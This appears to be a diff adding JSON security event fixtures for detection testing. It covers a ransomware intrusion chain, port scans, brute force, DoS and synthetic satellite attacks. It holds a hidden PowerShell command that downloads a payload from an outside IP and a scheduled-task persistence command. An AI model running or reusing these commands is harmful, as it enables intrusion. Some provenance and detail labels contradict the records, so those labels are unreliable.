@@ -1,0 +1,241 @@
+[
+  {
+    "_id": "REC-RANSOM-01",
+    "timestamp": "2026-09-18T16:15:00Z",
+    "source": "siem",
+    "event_type": "phishing_execution",
+    "host": "OPS-AP02",
+    "user": "david.operator",
+    "detail": "winword.exe opened attachment Urgent_Firmware_Patch_v4.rar exploiting CVE-2023-38831.",
+    "provenance_type": "real_sample",
+    "dataset_name": "OTRF Security Datasets",
+    "origin": "edr_sensor",
+    "raw": {
+      "cve": "CVE-2023-38831",
+      "attachment": "Urgent_Firmware_Patch_v4.rar",
+      "process": "winword.exe",
+      "EventID": 1
+    }
+  },
+  {
+    "_id": "REC-RANSOM-02",
+    "timestamp": "2026-09-18T16:18:00Z",
+    "source": "endpoint",
+    "event_type": "process_creation",
+    "host": "OPS-AP02",
+    "user": "david.operator",
+    "process": "powershell.exe",
+    "parent_process": "winword.exe",
+    "cmdline": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command (New-Object Net.WebClient).DownloadFile('http://185.214.66.91/stg.bin', 'C:\\ProgramData\\stg.dll')",
+    "detail": "Sysmon Event ID 1: Encoded PowerShell process creation downloading stage DLL from 185.214.66.91.",
+    "provenance_type": "real_sample",
+    "dataset_name": "OTRF Security Datasets",
+    "origin": "sysmon_channel",
+    "raw": {
+      "EventID": 1,
+      "ioc": "185.214.66.91",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ...",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+    }
+  },
+  {
+    "_id": "REC-RANSOM-03",
+    "timestamp": "2026-09-18T16:22:00Z",
+    "source": "endpoint",
+    "event_type": "credential_access",
+    "host": "OPS-AP02",
+    "user": "david.operator",
+    "process": "rundll32.exe",
+    "target_process": "lsass.exe",
+    "detail": "Sysmon Event ID 10: ProcessAccess granted 0x1F0FFF (PROCESS_ALL_ACCESS) into lsass.exe for credential dumping.",
+    "provenance_type": "real_sample",
+    "dataset_name": "OTRF Security Datasets",
+    "origin": "sysmon_channel",
+    "raw": {
+      "EventID": 10,
+      "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
+      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+      "GrantedAccess": "0x1F0FFF",
+      "CallTrace": "C:\\Windows\\System32\\ntdll.dll+0xa1b2c|C:\\Windows\\System32\\KERNELBASE.dll+0x24d80"
+    }
+  },
+  {
+    "_id": "REC-RANSOM-04",
+    "timestamp": "2026-09-18T16:30:00Z",
+    "source": "network_sensor",
+    "event_type": "c2_traffic",
+    "host": "OPS-AP02",
+    "src_ip": "10.10.8.22",
+    "dst_ip": "185.214.66.91",
+    "dst_port": 443,
+    "detail": "Encrypted HTTPS beaconing matching ThreatFox IOC 185.214.66.91:443 (Cobalt Strike C2).",
+    "provenance_type": "curated_snapshot",
+    "dataset_name": "ThreatFox Community Feed",
+    "origin": "threatfox_cti",
+    "raw": {
+      "ioc": "185.214.66.91",
+      "threat_type": "botnet_cc",
+      "malware": "Cobalt Strike",
+      "confidence_level": 95
+    }
+  },
+  {
+    "_id": "REC-RANSOM-05",
+    "timestamp": "2026-09-18T16:45:00Z",
+    "source": "endpoint",
+    "event_type": "persistence",
+    "host": "OPS-AP02",
+    "user": "SYSTEM",
+    "process": "schtasks.exe",
+    "cmdline": "schtasks.exe /create /tn \"AppHealthMonitor\" /tr \"rundll32.exe C:\\ProgramData\\stg.dll,Start\" /sc onstart /ru SYSTEM",
+    "detail": "Sysmon Event ID 1: Scheduled task created for system startup persistence under SYSTEM account.",
+    "provenance_type": "real_sample",
+    "dataset_name": "OTRF Security Datasets",
+    "origin": "sysmon_channel",
+    "raw": {
+      "EventID": 1,
+      "CommandLine": "schtasks.exe /create /tn \"AppHealthMonitor\" ...",
+      "subtechnique": "T1053.005"
+    }
+  },
+  {
+    "_id": "REC-RANSOM-06",
+    "timestamp": "2026-09-18T17:05:00Z",
+    "source": "siem",
+    "event_type": "lateral_movement",
+    "host": "ENG-DB01",
+    "src_host": "OPS-AP02",
+    "user": "svc_ops_admin",
+    "detail": "Remote SMB execution on engineering database server ENG-DB01 initiated from compromised OPS-AP02.",
+    "provenance_type": "real_sample",
+    "dataset_name": "OTRF Security Datasets",
+    "origin": "domain_siem",
+    "raw": {
+      "protocol": "SMB",
+      "subtechnique": "T1021.002",
+      "target": "ENG-DB01"
+    }
+  },
+  {
+    "_id": "REC-CICIDS-01",
+    "timestamp": "2026-09-18T20:10:00Z",
+    "source": "network_sensor",
+    "event_type": "port_scan",
+    "host": "DMZ-WEB01",
+    "src_ip": "172.16.0.1",
+    "dst_ip": "192.168.10.50",
+    "dst_port": 22,
+    "detail": "CIC-IDS2017: Massive SYN sweep (14,280 packets) against common TCP ports within 45 seconds.",
+    "provenance_type": "real_sample",
+    "dataset_name": "CIC-IDS2017",
+    "origin": "cicids_flow",
+    "raw": {
+      "flow_duration": 45120,
+      "total_fwd_packets": 14280,
+      "dataset_label": "PortScan",
+      "protocol": "TCP"
+    }
+  },
+  {
+    "_id": "REC-CICIDS-02",
+    "timestamp": "2026-09-18T20:25:00Z",
+    "source": "network_sensor",
+    "event_type": "ssh_brute_force",
+    "host": "DMZ-WEB01",
+    "src_ip": "172.16.0.1",
+    "dst_ip": "192.168.10.50",
+    "dst_port": 22,
+    "detail": "CIC-IDS2017: SSH-Patator brute force attack stream detected with 850 authentication handshakes.",
+    "provenance_type": "real_sample",
+    "dataset_name": "CIC-IDS2017",
+    "origin": "cicids_flow",
+    "raw": {
+      "flow_duration": 182000,
+      "total_fwd_packets": 3200,
+      "dataset_label": "SSH-Patator",
+      "protocol": "SSH"
+    }
+  },
+  {
+    "_id": "REC-CICIDS-03",
+    "timestamp": "2026-09-18T20:40:00Z",
+    "source": "network_sensor",
+    "event_type": "dos_loic_flood",
+    "host": "DMZ-WEB01",
+    "src_ip": "172.16.0.1",
+    "dst_ip": "192.168.10.50",
+    "dst_port": 80,
+    "detail": "CIC-IDS2017: Volumetric HTTP denial of service flood exceeding 45,000 requests per minute.",
+    "provenance_type": "real_sample",
+    "dataset_name": "CIC-IDS2017",
+    "origin": "cicids_flow",
+    "raw": {
+      "flow_duration": 600000,
+      "total_fwd_packets": 48200,
+      "dataset_label": "DoS Slowhttptest",
+      "protocol": "HTTP"
+    }
+  },
+  {
+    "_id": "REC-SPARTA-LIVE-01",
+    "timestamp": "2026-09-19T06:40:00Z",
+    "source": "satellite_sensor",
+    "event_type": "command_injection",
+    "host": "SATCOM-GW02",
+    "detail": "SPARTA EX-0030: Telecommand injection detected on satellite mission control downlink bus.",
+    "provenance_type": "synthetic",
+    "dataset_name": "SPARTA Space-Cyber Telemetry",
+    "origin": "space_payload_telemetry",
+    "raw": {
+      "sparta_technique": "EX-0030",
+      "technique_name": "Command Injection",
+      "subsystem": "TT&C"
+    }
+  },
+  {
+    "_id": "REC-SPARTA-LIVE-02",
+    "timestamp": "2026-09-19T07:10:00Z",
+    "source": "satellite_sensor",
+    "event_type": "bus_tampering",
+    "host": "SAT-BUS-AOCS",
+    "src_host": "SATCOM-GW02",
+    "detail": "SPARTA IMP-0004: Solar Array slewing command anomaly attempting thermal stress on photovoltaic panels.",
+    "provenance_type": "synthetic",
+    "dataset_name": "SPARTA Space-Cyber Telemetry",
+    "origin": "space_bus_controller",
+    "raw": {
+      "sparta_technique": "IMP-0004",
+      "technique_name": "Solar Array Slewing",
+      "subsystem": "Power & Solar Array"
+    }
+  },
+  {
+    "_id": "REC-SPARTA-LIVE-03",
+    "timestamp": "2026-09-19T07:35:00Z",
+    "source": "satellite_sensor",
+    "event_type": "attitude_loss_attempt",
+    "host": "SAT-BUS-AOCS",
+    "detail": "SPARTA IMP-0001: Reaction wheel desaturation cycle aborted by safety lockouts; spacecraft attitude preserved.",
+    "provenance_type": "synthetic",
+    "dataset_name": "SPARTA Space-Cyber Telemetry",
+    "origin": "space_bus_controller",
+    "raw": {
+      "sparta_technique": "IMP-0001",
+      "technique_name": "Loss of Attitude Control",
+      "action_result": "safety_circuit_intervene"
+    }
+  },
+  {
+    "_id": "REC-BENIGN-01",
+    "timestamp": "2026-09-19T08:00:00Z",
+    "source": "endpoint",
+    "event_type": "antivirus_scan_clean",
+    "host": "OPS-AP02",
+    "user": "system",
+    "detail": "Automated security health check and integrity validation completed cleanly.",
+    "provenance_type": "synthetic",
+    "dataset_name": "Operational Baseline",
+    "origin": "edr_agent"
+  }
+]
